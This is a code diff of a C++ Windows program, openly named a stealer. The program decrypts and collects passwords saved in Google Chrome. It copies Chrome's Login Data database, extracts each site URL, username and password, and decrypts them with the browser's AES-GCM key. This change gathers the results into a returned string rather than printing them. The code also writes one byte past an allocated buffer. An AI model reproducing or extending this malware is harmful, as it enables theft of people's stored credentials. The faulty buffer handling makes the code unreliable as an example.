@@ -13,7 +13,7 @@
 #include <sstream>
 #include "base64.cpp"
 #include "sqlite3.h"
-#include "aesgcm.cpp"
+#include "aesgcm_stealer.cpp"
 
 std::string get_chrome_localstate()
 {
@@ -62,7 +62,7 @@ void print_hex(BYTE *data, size_t dataLen)
     printf("\n");
 }
 
-void decrypt_password(std::string encrypted_pass, BYTE *key)
+std::string decrypt_password(std::string encrypted_pass, BYTE *key)
 {
     /*BYTE key_256[256];
     for (int i = 0; i < 256; i++)
@@ -85,15 +85,23 @@ void decrypt_password(std::string encrypted_pass, BYTE *key)
     cipher->Decrypt(iv, (size_t)iv_vec.size(), ciphertext, (size_t)ciphertext_vec.size(), tag, (size_t)tag_vec.size());
 
     // char* pt = new char[cipher->ptBufferSize+1];
-    for (int i = 0; i < cipher->ptBufferSize; i++)
+    /*for (int i = 0; i < cipher->ptBufferSize; i++)
     {
         printf("%c", (char)cipher->plaintext[i]);
+
     }
     printf("\n");
+    */
 
+    char* p = new char[cipher->ptBufferSize];
+    memcpy(p,cipher->plaintext,cipher->ptBufferSize);
+    p[cipher->ptBufferSize] = 0;
+    std::string str(p);
+
+    //std::cout<<p<<std::endl;
     delete cipher;
 
-    return;
+    return p;
 }
 
 LPCWSTR stringToLPCWSTR(std::string orig)
@@ -121,8 +129,10 @@ LPCWSTR stringToLPCWSTR(std::string orig)
     return wcstring;
 }
 
-int stealer()
+std::string stealer()
 {
+
+    std::string return_string = ""; 
     std::string localstate = get_chrome_localstate();
 
     std::string base64_key = get_encryptedkey(localstate);
@@ -162,8 +172,9 @@ int stealer()
     std::string chrome_db_path;
     if (user_path != nullptr)
         chrome_db_path = std::string(user_path) + "\\AppData\\Local\\Google\\Chrome\\User Data\\default\\Login Data";
-    std::cout << "No user path";
-
+    else{
+        std::cout << "No user path";
+    }
     std::string filename = "Login Data.db";
 
     CopyFileA(chrome_db_path.c_str(), filename.c_str(), FALSE);
@@ -173,7 +184,7 @@ int stealer()
     {
         printf("Can't open database... %s\n", sqlite3_errmsg(chrome_db));
         sqlite3_close(chrome_db);
-        return -1;
+        return "Can't open database... ";
     }
 
 
@@ -181,30 +192,45 @@ int stealer()
     sqlite3_stmt *stmt; 
     const char *sqlSentence = "SELECT origin_url, username_value, password_value FROM logins";
     int db_result = sqlite3_prepare_v2(chrome_db, sqlSentence, -1, &stmt, NULL);
-    if (db_result == SQLITE_OK)
-    {
+    if (db_result == SQLITE_OK){
         while (sqlite3_step(stmt) == SQLITE_ROW)
         {
             const unsigned char *origin_url = sqlite3_column_text(stmt, 0);
             const unsigned char *username_value = sqlite3_column_text(stmt, 1);
             const unsigned char *password_value = sqlite3_column_text(stmt, 2);
-            printf("--------------------------------\n");
+            //printf("--------------------------------\n");
 
-            printf("Origin URL: %s\n", origin_url);
-
-            printf("Username: %s\n", username_value);
+            //printf("Origin URL: %s\n", origin_url);
+            std::string s1 = "Origin URL: "; 
+            std::string s2 = "Username: ";
+            std::string s3 = "Password: ";
+            std::string s4 =  "\n";
+            std::string s5 = "--------------------------------\n";
+            std::string string_url = reinterpret_cast<const char*>(origin_url);
+            std::string string_user = reinterpret_cast<const char*>(username_value);
+            
+            
+            //printf("Username: %s\n", username_value);
 
             const char *char_pass = reinterpret_cast<const char *>(password_value);
+            std::string string_pass = char_pass;
             std::string str_pass(char_pass);
-
+            std::string string_password;
             try
             {
-                decrypt_password(str_pass, result);
+                string_password = decrypt_password(str_pass, result);
+                
             }
             catch (const std::exception &e)
             {
                 std::cout << e.what() << std::endl;
             }
+
+            return_string.append(s5);
+            return_string.append(s1+string_url+s4);
+            return_string.append(s2+string_user+s4);
+            return_string.append(s3+string_password+s4);
+            
             
         }
     }
@@ -212,14 +238,18 @@ int stealer()
             printf("SQL statement preparation failed... %s\n", sqlite3_errmsg(chrome_db));
             sqlite3_finalize(stmt);
             sqlite3_close(chrome_db);
-            return -1;
+            return "SQL statement preparation failed...";
         
         }
 
-        sqlite3_finalize(stmt);
-        sqlite3_close(chrome_db);
+    sqlite3_finalize(stmt);
+    sqlite3_close(chrome_db);
+    
+        
 
-        return 0;
+        return return_string;
+
+        
 }
 
 
